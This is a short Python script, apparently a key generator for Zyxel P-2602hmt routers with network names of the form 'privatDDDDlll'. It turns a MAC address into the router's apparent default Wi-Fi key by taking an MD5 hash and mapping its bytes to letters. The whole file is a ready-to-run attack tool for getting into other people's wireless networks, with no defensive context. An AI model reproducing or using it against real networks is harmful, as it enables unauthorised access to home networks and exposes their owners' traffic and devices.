# For Zyxel P-2602hmt
# ESSID : privatDDDDlll
# Mac in lower case without colons nor offset
import hashlib
import argparse

def p2602hmt(mac):
    # First MD5 round
    md5 = hashlib.md5()
    md5.update(mac.encode())
    dgst = md5.digest()

    moduli = []
    for i in dgst:
        moduli.append(i % 26)
    
    key = ""
    for i in moduli:
        key += chr(i+97)
    print(key[:10])

parser = argparse.ArgumentParser(description='Zyxel P-2602hmt Keygen')
parser.add_argument('mac', help='Mac address (lower case without colons nor offset)')
args = parser.parse_args()

p2602hmt(args.mac)
